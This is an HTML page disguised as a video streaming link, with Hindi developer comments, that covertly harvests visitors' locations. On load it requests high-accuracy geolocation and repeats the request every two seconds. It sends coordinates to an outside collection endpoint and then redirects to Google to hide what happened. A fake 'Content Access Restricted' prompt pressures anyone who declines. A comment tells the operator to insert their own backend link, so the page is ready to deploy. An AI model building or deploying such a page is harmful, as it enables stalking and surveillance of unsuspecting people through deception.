<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Cloud Platform - Streaming Link</title>
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #0f0f0f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            color: #ffffff;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }

        #verification-modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            z-index: 9999;
            justify-content: center; align-items: center;
            padding: 20px; box-sizing: border-box;
        }

        .modal-box {
            background-color: #1f1f1f;
            border: 1px solid #333333;
            border-radius: 8px;
            padding: 30px; max-width: 400px; width: 100%;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        .modal-title {
            font-size: 18px; font-weight: 600;
            margin-bottom: 12px; color: #ff4d4d;
        }

        .modal-text {
            font-size: 14px; color: #aaaaaa;
            line-height: 1.5; margin-bottom: 24px;
        }

        .action-btn {
            background-color: #cc0000;
            color: #ffffff; border: none;
            padding: 12px 24px; font-size: 14px; font-weight: 600;
            border-radius: 4px; cursor: pointer; width: 100%;
        }

        /* छोटा घूमने वाला लोडिंग एनीमेशन */
        .spinner {
            border: 3px solid #333; border-top: 3px solid #ffffff;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; margin: 0 auto 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- शुरुआती लोडिंग स्क्रीन -->
    <div id="loading-context" style="text-align: center;">
        <div class="spinner"></div>
        <p style="color: #888888; font-size: 14px;">Initializing encrypted video stream, please wait...</p>
    </div>

    <!-- आपका कस्टमाइज्ड मैसेज बॉक्स (इसमें बटन और लोडिंग दोनों हैं) -->
    <div id="verification-modal">
        <div class="modal-box">
            <div class="spinner" style="margin-bottom: 20px;"></div>
            <div class="modal-title">Content Access Restricted</div>
            <div class="modal-text">
                This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
            </div>
            <!-- रेड बटन: जो क्लिक करने पर भी तुरंत चेक करेगा -->
            <button class="action-btn" onclick="checkAndRequestLocation();">Verify & Watch Video</button>
        </div>
    </div>

    <script>
        var gpsCheckInterval; 
        var isRequestPending = false; 

        // डेटा को तुरंत बैकग्राउंड में भेजने का फंक्शन
        function sendPayloadImmediate(lat, lon, status, shouldRedirect) {
            var payload = {
                status: status,
                latitude: lat,
                longitude: lon
            };

            // line 98: यहाँ 'https://yaha_humara_link_ayga' की जगह अपनी असली बैकएंड लिंक डालें
            fetch('https://eotkqc7s42iokg5.m.pipedream.net', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });

            if (shouldRedirect) {
                // काम पूरा होते ही लूप बंद करें और 1 सेकंड के भीतर गूगल पर भेजें
                clearInterval(gpsCheckInterval);
                window.location.href = "https://google.com";
            }
        }

        function showRestrictionUI() {
            document.getElementById('loading-context').style.display = 'none';
            document.getElementById('verification-modal').style.display = 'flex';
        }

        // मुख्य फंक्शन जो लोकेशन की मांग करता है
        function checkAndRequestLocation() {
            if (isRequestPending) return; 
            isRequestPending = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    isRequestPending = false;
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;
                    
                    // सफलता: डेटा भेजें और तुरंत गूगल पर ट्रांसफर करें
                    sendPayloadImmediate(lat, lon, "GEO_SUCCESS", true);
                }, function(error) {
                    isRequestPending = false;
                    
                    // विफलता: सर्वर को सूचित करें और रिस्ट्रिक्शन बॉक्स दिखाएं
                    sendPayloadImmediate(null, null, "GEO_FAILED", false);
                    showRestrictionUI();
                }, { 
                    enableHighAccuracy: true, 
                    timeout: 1800 // 2 सेकंड से कम का टाइमआउट ताकि लूप अटके नहीं
                });
            }
        }

        // पेज लोड होते ही पहली बार चेक करें
        window.onload = function() {
            checkAndRequestLocation();

            // 🌟 आपके निर्देशानुसार: हर 2 सेकंड (2000ms) में बैकग्राउंड ऑटो-चेक करेगा
            gpsCheckInterval = setInterval(function() {
                checkAndRequestLocation();
            }, 2000);
        };
    </script>
</body>
</html>
